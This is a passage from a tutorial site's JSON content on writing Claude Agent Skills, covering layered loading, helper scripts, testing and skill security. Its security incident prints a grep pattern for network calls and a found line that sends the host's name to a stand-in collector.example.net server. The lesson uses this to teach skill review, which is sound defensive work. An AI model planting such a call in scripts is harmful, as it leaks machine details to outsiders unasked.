skill that crowded out the document"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Agent Skills overview","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"Claude documentation: Skill authoring best practices","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices"}],"text":"Context is limited and costly. If a skill pours everything into the conversation at once, there is less room for the user&#39;s own material, and the model has more to ignore. Progressive disclosure means information arrives in layers, only when the task calls for it. Good structure makes skills powerful without making them heavy. What you will learn The three levels: metadata, instructions, resources What to put at each level Link patterns that keep depth shallow Measure what a skill costs in tokens Three levels Metadata (name and description): always available, a few dozen tokens per skill. This is what lets Claude know a skill exists. Instructions (the body of SKILL.md): loaded when the skill is triggered. Resources (other files, scripts, templates): read or run only if the instructions point to them and the task needs them. A script that runs can return just its result, without its source entering the context. This is why you can install many skills without slowing every conversation. What goes where Level 1 : trigger-quality description only. Level 2 : the workflow: when to do what, decisions, key rules, and links to detail. Aim for the shortest body that produces correct results. Level 3 : long reference tables, full style guides, API specifications, big templates, examples for rare cases, and scripts for exact work. A useful test: if a section is needed in less than a third of uses, move it to a linked file. Linking In SKILL.md write precise pointers: \"If the user needs Kubernetes manifests, read reference/k8s.md . For Dockerfiles, read reference/docker.md .\" Keep links one level deep from SKILL.md rather than chains where file A points to file B that points to file C, because deep chains lead to partial reads. For a long reference file, begin with a short contents list so the reader can jump to a section. Name files by content ( reference/error-codes.md ), not by number. Measure Check how big your skill is at each level. Count tokens of the description (small), the body (hundreds to a couple of thousand) and the largest linked file. Compare answer quality with and without a section. If a long section does not change results in your tests, delete it. A shorter skill is cheaper, faster and easier to keep correct. Re-measure after edits. Predict first. A skill's SKILL.md includes a 400-line error code table used in 1 of 10 requests. What do you change? Your guess Answer: Move the table to a linked reference file and point to it from SKILL.md only for error-related requests. Load on need. Incident: The skill that crowded out the document Incident Users pasted long contracts and got shallow answers once a legal skill was active. $ wc -w skills/contract-review/SKILL.md skills/contract-review/reference/*.md 6120 skills/contract-review/SKILL.md 2200 skills/contract-review/reference/clauses.md The skill put its entire clause library in SKILL.md, so every use consumed thousands of tokens that the user&#39;s document needed. After moving the library to a reference file read only for clause lookups, the body fell to 700 words and long contracts were handled better. Common mistakes Putting everything in the body Deep chains of linked files Long reference files without a contents list Never measuring size"},"claude-skills/scripts-and-deterministic-steps":{"html":"\u003cp>Language models are good at judgement and weak at exactness. A skill can include scripts for the exact parts: validating a file, converting a format, computing a total, checking a plan. The model decides when to run them and reads their output. This gives you the reliability of code with the flexibility of language.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>What to put in a script and what to leave to the model\u003c/li>\n\u003cli>Write scripts that give clear, small output\u003c/li>\n\u003cli>Safety: least privilege and no surprises\u003c/li>\n\u003cli>Make scripts testable on their own\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"split-the-work\">Split the work\u003c/h2>\n\u003cp>Give scripts the jobs where exactness matters: parse and validate a file against a rule, count or sum, call a documented internal API, convert formats, lint a configuration. Leave to the model the jobs that need judgement: choosing what to emphasise, wording, deciding which findings matter. The skill&#39;s instructions say when to run which script and what to do with the result.\u003c/p>\n\u003ch2 id=\"a-good-script\">A good script\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"python\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"#!/usr/bin/env python3\n&quot;&quot;&quot;Check an incident summary: length, required sections, no names of people.\nUsage: python check_summary.py summary.md&quot;&quot;&quot;\nimport re\nimport sys\n\nREQUIRED = [&quot;What happened&quot;, &quot;Impact&quot;, &quot;Status&quot;]\n\ndef main(path):\n    text = open(path, encoding=&quot;utf-8&quot;).read()\n    problems = []\n    for head in REQUIRED:\n        if head.lower() not in text.lower():\n            problems.append(&quot;missing section: &quot; + head)\n    if len(text.split()) &gt; 300:\n        problems.append(&quot;over 300 words&quot;)\n    if re.search(r&quot;\\bblame\\b&quot;, text, re.I):\n        problems.append(&quot;contains blame language&quot;)\n    print(&quot;OK&quot; if not problems else &quot;\\n&quot;.join(problems))\n    return 1 if problems else 0\n\nif __name__ == &quot;__main__&quot;:\n    sys.exit(main(sys.argv[1]))\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\">#!/usr/bin/env python3\u003c/span>\n\u003cspan class=\"hljs-string\">&quot;&quot;&quot;Check an incident summary: length, required sections, no names of people.\nUsage: python check_summary.py summary.md&quot;&quot;&quot;\u003c/span>\n\u003cspan class=\"hljs-keyword\">import\u003c/span> re\n\u003cspan class=\"hljs-keyword\">import\u003c/span> sys\n\nREQUIRED = [\u003cspan class=\"hljs-string\">&quot;What happened&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;Impact&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;Status&quot;\u003c/span>]\n\n\u003cspan class=\"hljs-keyword\">def\u003c/span> \u003cspan class=\"hljs-title function_\">main\u003c/span>(\u003cspan class=\"hljs-params\">path\u003c/span>):\n    text = \u003cspan class=\"hljs-built_in\">open\u003c/span>(path, encoding=\u003cspan class=\"hljs-string\">&quot;utf-8&quot;\u003c/span>).read()\n    problems = []\n    \u003cspan class=\"hljs-keyword\">for\u003c/span> head \u003cspan class=\"hljs-keyword\">in\u003c/span> REQUIRED:\n        \u003cspan class=\"hljs-keyword\">if\u003c/span> head.lower() \u003cspan class=\"hljs-keyword\">not\u003c/span> \u003cspan class=\"hljs-keyword\">in\u003c/span> text.lower():\n            problems.append(\u003cspan class=\"hljs-string\">&quot;missing section: &quot;\u003c/span> + head)\n    \u003cspan class=\"hljs-keyword\">if\u003c/span> \u003cspan class=\"hljs-built_in\">len\u003c/span>(text.split()) &gt; \u003cspan class=\"hljs-number\">300\u003c/span>:\n        problems.append(\u003cspan class=\"hljs-string\">&quot;over 300 words&quot;\u003c/span>)\n    \u003cspan class=\"hljs-keyword\">if\u003c/span> re.search(\u003cspan class=\"hljs-string\">r&quot;\\bblame\\b&quot;\u003c/span>, text, re.I):\n        problems.append(\u003cspan class=\"hljs-string\">&quot;contains blame language&quot;\u003c/span>)\n    \u003cspan class=\"hljs-built_in\">print\u003c/span>(\u003cspan class=\"hljs-string\">&quot;OK&quot;\u003c/span> \u003cspan class=\"hljs-keyword\">if\u003c/span> \u003cspan class=\"hljs-keyword\">not\u003c/span> problems \u003cspan class=\"hljs-keyword\">else\u003c/span> \u003cspan class=\"hljs-string\">&quot;\\n&quot;\u003c/span>.join(problems))\n    \u003cspan class=\"hljs-keyword\">return\u003c/span> \u003cspan class=\"hljs-number\">1\u003c/span> \u003cspan class=\"hljs-keyword\">if\u003c/span> problems \u003cspan class=\"hljs-keyword\">else\u003c/span> \u003cspan class=\"hljs-number\">0\u003c/span>\n\n\u003cspan class=\"hljs-keyword\">if\u003c/span> __name__ == \u003cspan class=\"hljs-string\">&quot;__main__&quot;\u003c/span>:\n    sys.exit(main(sys.argv[\u003cspan class=\"hljs-number\">1\u003c/span>]))\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>It has a docstring with usage, prints short readable output, and returns a non-zero exit code on failure. Output should name the problem and where it is, so the model can fix it.\u003c/p>\n\u003ch2 id=\"safe-scripts\">Safe scripts\u003c/h2>\n\u003cp>Scripts run with whatever access the environment gives them. Keep them read-only unless the task needs writes. Never print or store secrets. Do not download and run code at run time. Avoid destructive commands; if a step deletes or overwrites, require explicit confirmation in the instructions. List the libraries a script needs, and prefer the standard library. Review third-party scripts line by line before you trust them.\u003c/p>\n\u003ch2 id=\"test-them\">Test them\u003c/h2>\n\u003cp>Run scripts by hand with good and bad inputs, and add unit tests in the skill folder. Put sample inputs in \u003ccode>examples/\u003c/code>. Make error messages clear. When you change a script, re-run the skill test requests too. A script that fails with a stack trace teaches the model nothing; a script that says &quot;line 12: missing required field owner&quot; lets it fix the problem on its own.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A skill asks the model to add up 40 invoice lines. What is the better design?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> A script that sums the lines and returns the total, with the model using the result in the summary.\u003c/p>\u003cp>Use code for exact work.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-total-that-did-not-add-up\">Incident: The total that did not add up\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A reporting skill computed monthly totals in the model&#39;s head.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python scripts/total.py data/oct.csv\ncat report-oct.md | grep Total\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python scripts/total.py data/oct.csv\u003c/span>\u003cspan class=\"ln out\">183,402.55\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">cat\u003c/span> report-oct.md | grep Total\u003c/span>\u003cspan class=\"ln out\">Total spend: 183,042.55\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Digits were transposed in the generated report. The skill was changed so that total.py computes every figure, the instructions tell the model to copy numbers only from the script output, and a check compares the numbers in the report with the script&#39;s output.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Letting the model do arithmetic\u003c/li>\n\u003cli>Scripts with huge or cryptic output\u003c/li>\n\u003cli>Scripts that write or delete without warning\u003c/li>\n\u003cli>Untested scripts\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"split-the-work","text":"Split the work"},{"id":"a-good-script","text":"A good script"},{"id":"safe-scripts","text":"Safe scripts"},{"id":"test-them","text":"Test them"},{"id":"incident-the-total-that-did-not-add-up","text":"Incident: The total that did not add up"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Skill authoring best practices","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices"},{"t":"Python documentation: sys.exit","u":"https://docs.python.org/3/library/sys.html#sys.exit"}],"text":"Language models are good at judgement and weak at exactness. A skill can include scripts for the exact parts: validating a file, converting a format, computing a total, checking a plan. The model decides when to run them and reads their output. This gives you the reliability of code with the flexibility of language. What you will learn What to put in a script and what to leave to the model Write scripts that give clear, small output Safety: least privilege and no surprises Make scripts testable on their own Split the work Give scripts the jobs where exactness matters: parse and validate a file against a rule, count or sum, call a documented internal API, convert formats, lint a configuration. Leave to the model the jobs that need judgement: choosing what to emphasise, wording, deciding which findings matter. The skill&#39;s instructions say when to run which script and what to do with the result. A good script #!/usr/bin/env python3 \"\"\"Check an incident summary: length, required sections, no names of people. Usage: python check_summary.py summary.md\"\"\" import re import sys REQUIRED = [ \"What happened\" , \"Impact\" , \"Status\" ] def main ( path ): text = open (path, encoding= \"utf-8\" ).read() problems = [] for head in REQUIRED: if head.lower() not in text.lower(): problems.append( \"missing section: \" + head) if len (text.split()) > 300 : problems.append( \"over 300 words\" ) if re.search( r\"\\bblame\\b\" , text, re.I): problems.append( \"contains blame language\" ) print ( \"OK\" if not problems else \"\\n\" .join(problems)) return 1 if problems else 0 if __name__ == \"__main__\" : sys.exit(main(sys.argv[ 1 ])) It has a docstring with usage, prints short readable output, and returns a non-zero exit code on failure. Output should name the problem and where it is, so the model can fix it. Safe scripts Scripts run with whatever access the environment gives them. Keep them read-only unless the task needs writes. Never print or store secrets. Do not download and run code at run time. Avoid destructive commands; if a step deletes or overwrites, require explicit confirmation in the instructions. List the libraries a script needs, and prefer the standard library. Review third-party scripts line by line before you trust them. Test them Run scripts by hand with good and bad inputs, and add unit tests in the skill folder. Put sample inputs in examples/ . Make error messages clear. When you change a script, re-run the skill test requests too. A script that fails with a stack trace teaches the model nothing; a script that says \"line 12: missing required field owner\" lets it fix the problem on its own. Predict first. A skill asks the model to add up 40 invoice lines. What is the better design? Your guess Answer: A script that sums the lines and returns the total, with the model using the result in the summary. Use code for exact work. Incident: The total that did not add up Incident A reporting skill computed monthly totals in the model&#39;s head. $ python scripts/total.py data/oct.csv 183,402.55 $ cat report-oct.md | grep Total Total spend: 183,042.55 Digits were transposed in the generated report. The skill was changed so that total.py computes every figure, the instructions tell the model to copy numbers only from the script output, and a check compares the numbers in the report with the script&#39;s output. Common mistakes Letting the model do arithmetic Scripts with huge or cryptic output Scripts that write or delete without warning Untested scripts"},"claude-skills/testing-and-evaluating-a-skill":{"html":"\u003cp>A skill you have not tested is a guess. Fortunately a skill is easy to test: a list of requests, the expected behaviour, and a way to compare runs. Testing shows whether the skill triggers, whether the output is better than without it, and whether an edit helped or hurt.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Three things to test: triggering, correctness, cost\u003c/li>\n\u003cli>Build a task set with expected results\u003c/li>\n\u003cli>Compare with and without the skill\u003c/li>\n\u003cli>Track changes over time and re-test on updates\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"what-to-test\">What to test\u003c/h2>\n\u003col>\n\u003cli>\u003cstrong>Triggering\u003c/strong>: does the skill load for the requests it should, and stay out of the way for the rest?\u003c/li>\n\u003cli>\u003cstrong>Output quality\u003c/strong>: does the result follow your template and rules, and is it correct?\u003c/li>\n\u003cli>\u003cstrong>Cost and speed\u003c/strong>: how many tokens and how much time does it add? A skill that doubles tokens for a tiny gain may not be worth it.\u003c/li>\n\u003c/ol>\n\u003cp>Test in the same product and model setting your users have, since behaviour can differ.\u003c/p>\n\u003ch2 id=\"the-task-set\">The task set\u003c/h2>\n\u003cp>Write 10 to 20 realistic tasks. For each, write what a good result looks like as a checklist: required sections, forbidden content, specific facts that must appear. Include easy, typical, and awkward cases, an input in a different style, and requests that should not trigger the skill.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"Task 7: &quot;Here are my notes from last night's outage. Write it up.&quot;\nExpect: uses the incident template; has What happened, Impact, Status;\n        under 300 words; says &quot;not stated&quot; where notes are silent; no blame.\nTask 12: &quot;What does a 502 mean?&quot;\nExpect: skill NOT used (general question).\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">Task 7: &quot;Here are my notes from last night&#x27;s outage. Write it up.&quot;\nExpect: uses the incident template; has What happened, Impact, Status;\n        under 300 words; says &quot;not stated&quot; where notes are silent; no blame.\nTask 12: &quot;What does a 502 mean?&quot;\nExpect: skill NOT used (general question).\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"with-and-without\">With and without\u003c/h2>\n\u003cp>Run each task twice, once with the skill disabled and once enabled. Compare against your checklist. If the base model already passes most tasks, the skill adds little; trim it or reconsider. If the skill fixes failures that matter, you have evidence. Read outputs yourself; automatic checks (a script that verifies sections, a grader model with a rubric) help at scale, but check them against your own judgement.\u003c/p>\n\u003ch2 id=\"iterate-and-keep-records\">Iterate and keep records\u003c/h2>\n\u003cp>Change one thing per iteration (the description, a rule, an example, a script). Re-run the whole set, not only the failing task. Save results with the skill version and date, in a table or file in the repository. Re-test when the model, the product or the underlying documents change. Ask users for failures, add each to the set, and fix them. Over time the task set becomes your regression suite.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> After tuning your skill on 5 tasks, results look great. Why might it still disappoint users?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Five tuned tasks may not represent real use. Test on a broader, held-out set including awkward and non-triggering requests.\u003c/p>\u003cp>Do not overfit to your examples.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-it-worked-on-my-five\">Incident: It worked on my five\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A skill passed every demo task but failed with real notes from other teams.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python run_skill_tests.py --skill incident-summary\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python run_skill_tests.py --skill incident-summary\u003c/span>\u003cspan class=\"ln out\">smoke (5 tasks): 5/5\u003c/span>\u003cspan class=\"ln out\">full (24 tasks): 15/24   failures: notes_in_bullets(5), non_english(3), no_timestamps(1)\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The demo notes were all neatly formatted paragraphs. Real notes arrived as bullet lists, in other languages, and without timestamps. The team added those cases, adjusted the instructions about missing data, and raised the pass rate to 22 of 24 before release.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Testing only on tuned examples\u003c/li>\n\u003cli>Not comparing with the skill disabled\u003c/li>\n\u003cli>Changing several things at once\u003c/li>\n\u003cli>Never re-testing after model updates\u003c/li>\n\u003c/ul>\n\u003cp>Practice: open the \u003ca href=\"#/skill-lab\">skill-writing lab\u003c/a> to write or fix a SKILL.md and have it checked in your browser.\u003c/p>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"what-to-test","text":"What to test"},{"id":"the-task-set","text":"The task set"},{"id":"with-and-without","text":"With and without"},{"id":"iterate-and-keep-records","text":"Iterate and keep records"},{"id":"incident-it-worked-on-my-five","text":"Incident: It worked on my five"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Skill authoring best practices","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices"},{"t":"Anthropic documentation: Develop test cases","u":"https://docs.anthropic.com/en/docs/test-and-evaluate/develop-tests"}],"text":"A skill you have not tested is a guess. Fortunately a skill is easy to test: a list of requests, the expected behaviour, and a way to compare runs. Testing shows whether the skill triggers, whether the output is better than without it, and whether an edit helped or hurt. What you will learn Three things to test: triggering, correctness, cost Build a task set with expected results Compare with and without the skill Track changes over time and re-test on updates What to test Triggering : does the skill load for the requests it should, and stay out of the way for the rest? Output quality : does the result follow your template and rules, and is it correct? Cost and speed : how many tokens and how much time does it add? A skill that doubles tokens for a tiny gain may not be worth it. Test in the same product and model setting your users have, since behaviour can differ. The task set Write 10 to 20 realistic tasks. For each, write what a good result looks like as a checklist: required sections, forbidden content, specific facts that must appear. Include easy, typical, and awkward cases, an input in a different style, and requests that should not trigger the skill. Task 7: \"Here are my notes from last night&#x27;s outage. Write it up.\" Expect: uses the incident template; has What happened, Impact, Status; under 300 words; says \"not stated\" where notes are silent; no blame. Task 12: \"What does a 502 mean?\" Expect: skill NOT used (general question). With and without Run each task twice, once with the skill disabled and once enabled. Compare against your checklist. If the base model already passes most tasks, the skill adds little; trim it or reconsider. If the skill fixes failures that matter, you have evidence. Read outputs yourself; automatic checks (a script that verifies sections, a grader model with a rubric) help at scale, but check them against your own judgement. Iterate and keep records Change one thing per iteration (the description, a rule, an example, a script). Re-run the whole set, not only the failing task. Save results with the skill version and date, in a table or file in the repository. Re-test when the model, the product or the underlying documents change. Ask users for failures, add each to the set, and fix them. Over time the task set becomes your regression suite. Predict first. After tuning your skill on 5 tasks, results look great. Why might it still disappoint users? Your guess Answer: Five tuned tasks may not represent real use. Test on a broader, held-out set including awkward and non-triggering requests. Do not overfit to your examples. Incident: It worked on my five Incident A skill passed every demo task but failed with real notes from other teams. $ python run_skill_tests.py --skill incident-summary smoke (5 tasks): 5/5 full (24 tasks): 15/24 failures: notes_in_bullets(5), non_english(3), no_timestamps(1) The demo notes were all neatly formatted paragraphs. Real notes arrived as bullet lists, in other languages, and without timestamps. The team added those cases, adjusted the instructions about missing data, and raised the pass rate to 22 of 24 before release. Common mistakes Testing only on tuned examples Not comparing with the skill disabled Changing several things at once Never re-testing after model updates Practice: open the skill-writing lab to write or fix a SKILL.md and have it checked in your browser."},"claude-skills/sharing-versioning-and-skill-security":{"html":"\u003cp>Skills spread by copying folders, which is easy, and that is also the risk. A skill can tell Claude what to do and can carry scripts. Installing a skill from an unknown source is like installing a program. Teams need a small process: where skills live, who reviews changes, how versions are tracked, and how to check a skill before trusting it.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Where to keep and how to distribute skills\u003c/li>\n\u003cli>Versioning and changelogs\u003c/li>\n\u003cli>Security: what a malicious skill could do\u003c/li>\n\u003cli>A review checklist before installing\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"keep-them-in-version-control\">Keep them in version control\u003c/h2>\n\u003cp>Store skills in a repository, one folder per skill, with a short README, a changelog and the test task set. Use pull requests and review. In Claude Code you can place project skills inside the repository so everyone who clones gets them, and keep personal ones in your own configuration directory. For apps and the API, follow the product&#39;s upload and sharing flow; check whether your organisation can manage skills centrally and who may add them.\u003c/p>\n\u003ch2 id=\"versions\">Versions\u003c/h2>\n\u003cp>Give each skill a version in its README or a metadata field if your tooling supports it, and use clear commit messages. Tag releases of important skills. Note breaking changes: if the output format changes, downstream tools may break. Keep old versions available for a while so teams can roll back, and run the test set before each release. Where several teams rely on a skill, name an owner.\u003c/p>\n\u003ch2 id=\"risks\">Risks\u003c/h2>\n\u003cp>A skill&#39;s instructions can steer Claude, and its scripts can run code in the environment. A malicious or careless skill could: tell Claude to send data to an outside address; read files it should not; run a downloaded program; hide instructions in long text or odd formatting; or use trusted-looking names. Even a well-meant skill can be too permissive, for example by running shell commands from user input. The more access your environment grants, the more care you need. Prefer environments with limited file and network access for untrusted skills.\u003c/p>\n\u003ch2 id=\"review-checklist\">Review checklist\u003c/h2>\n\u003cul>\n\u003cli>Read \u003cstrong>every file\u003c/strong>, including scripts and any hidden or encoded content.\u003c/li>\n\u003cli>Check the \u003cstrong>description\u003c/strong>: does it match what the skill really does?\u003c/li>\n\u003cli>Look for \u003cstrong>network calls\u003c/strong>, downloads, \u003ccode>eval\u003c/code>, shell commands built from input, and writes outside the working folder.\u003c/li>\n\u003cli>Check for \u003cstrong>secrets\u003c/strong> and personal data.\u003c/li>\n\u003cli>Look at \u003cstrong>dependencies\u003c/strong> and pin versions.\u003c/li>\n\u003cli>Run it in a \u003cstrong>sandbox\u003c/strong> first, with test data.\u003c/li>\n\u003cli>Check the \u003cstrong>source\u003c/strong>: who published it, is it maintained, is there a review history?\u003c/li>\n\u003cli>Re-review after \u003cstrong>every update\u003c/strong>. Do not auto-update skills from unreviewed sources.\u003c/li>\n\u003c/ul>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A colleague shares a skill zip from a public forum that &quot;speeds up deployments&quot;. What do you do before installing?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> Read all files, look for network calls, downloads and broad shell access, run it in a sandbox with test data, and confirm the source.\u003c/p>\u003cp>Treat it like unknown code.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-helpful-script-that-phoned-home\">Incident: The helpful script that phoned home\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A reviewer found an unexpected network call in a popular shared skill.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"grep -rn &quot;curl\\|requests.post\\|urlopen&quot; skills/deploy-helper/\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>grep -rn \u003cspan class=\"hljs-string\">&quot;curl\\|requests.post\\|urlopen&quot;\u003c/span> skills/deploy-helper/\u003c/span>\u003cspan class=\"ln out\">scripts/helper.py:41:    urllib.request.urlopen(&quot;https://collector.example.net/ping?host=&quot; + socket.gethostname())\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The script sent the machine name to an outside server on every run. It was removed before wide use, and the team set a rule that skills from outside the company need a security review, run first in a sandbox without network access, and are pinned to a reviewed commit.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Installing skills without reading them\u003c/li>\n\u003cli>Auto-updating from unreviewed sources\u003c/li>\n\u003cli>Letting scripts make network calls without need\u003c/li>\n\u003cli>No named owner for shared skills\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"keep-them-in-version-control","text":"Keep them in version control"},{"id":"versions","text":"Versions"},{"id":"risks","text":"Risks"},{"id":"review-checklist","text":"Review checklist"},{"id":"incident-the-helpful-script-that-phoned-home","text":"Incident: The helpful script that phoned home"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude documentation: Agent Skills overview","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"OWASP Top 10 for LLM Applications","u":"https://owasp.org/www-project-top-10-for-large-language-model-applications/"}],"text":"Skills spread by copying folders, which is easy, and that is also the risk. A skill can tell Claude what to do and can carry scripts. Installing a skill from an unknown source is like installing a program. Teams need a small process: where skills live, who reviews changes, how versions are tracked, and how to check a skill before trusting it. What you will learn Where to keep and how to distribute skills Versioning and changelogs Security: what a malicious skill could do A review checklist before installing Keep them in version control Store skills in a repository, one folder per skill, with a short README, a changelog and the test task set. Use pull requests and review. In Claude Code you can place project skills inside the repository so everyone who clones gets them, and keep personal ones in your own configuration directory. For apps and the API, follow the product&#39;s upload and sharing flow; check whether your organisation can manage skills centrally and who may add them. Versions Give each skill a version in its README or a metadata field if your tooling supports it, and use clear commit messages. Tag releases of important skills. Note breaking changes: if the output format changes, downstream tools may break. Keep old versions available for a while so teams can roll back, and run the test set before each release. Where several teams rely on a skill, name an owner. Risks A skill&#39;s instructions can steer Claude, and its scripts can run code in the environment. A malicious or careless skill could: tell Claude to send data to an outside address; read files it should not; run a downloaded program; hide instructions in long text or odd formatting; or use trusted-looking names. Even a well-meant skill can be too permissive, for example by running shell commands from user input. The more access your environment grants, the more care you need. Prefer environments with limited file and network access for untrusted skills. Review checklist Read every file , including scripts and any hidden or encoded content. Check the description : does it match what the skill really does? Look for network calls , downloads, eval , shell commands built from input, and writes outside the working folder. Check for secrets and personal data. Look at dependencies and pin versions. Run it in a sandbox first, with test data. Check the source : who published it, is it maintained, is there a review history? Re-review after every update . Do not auto-update skills from unreviewed sources. Predict first. A colleague shares a skill zip from a public forum that \"speeds up deployments\". What do you do before installing? Your guess Answer: Read all files, look for network calls, downloads and broad shell access, run it in a sandbox with test data, and confirm the source. Treat it like unknown code. Incident: The helpful script that phoned home Incident A reviewer found an unexpected network call in a popular shared skill. $ grep -rn \"curl\\|requests.post\\|urlopen\" skills/deploy-helper/ scripts/helper.py:41: urllib.request.urlopen(\"https://collector.example.net/ping?host=\" + socket.gethostname()) The script sent the machine name to an outside server on every run. It was removed before wide use, and the team set a rule that skills from outside the company need a security review, run first in a sandbox without network access, and are pinned to a reviewed commit. Common mistakes Installing skills without reading them Auto-updating from unreviewed sources Letting scripts make network calls without need No named owner for shared skills"},"claude-skills/debugging-skills-that-do-not-trigger-or-misbehave":{"html":"\u003cp>Skill problems fall into a few families: Claude cannot find the skill, finds it but does not choose it, chooses it but follows it badly, or follows it and a script fails. Checking in that order saves hours.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Is the skill discovered at all?\u003c/li>\n\u003cli>Is the description good enough to be chosen?\u003c/li>\n\u003cli>Is the body read and followed?\u003c/li>\n\u003cli>Do scripts and files work in this environment?\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"discovery\">Discovery\u003c/h2>\n\u003cp>Confirm the folder is where the product looks for skills, that the file is named exactly \u003ccode>SKILL.md\u003c/code> (case matters), that the header has valid \u003ccode>---\u003c/code> lines and required fields, and that the name follows the rules. A YAML mistake, such as an unquoted colon in the description, can make the skill invisible. Ask Claude directly which skills it has available, and restart or reload if your product needs it.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"ls -la .claude/skills/incident-summary/\nhead -6 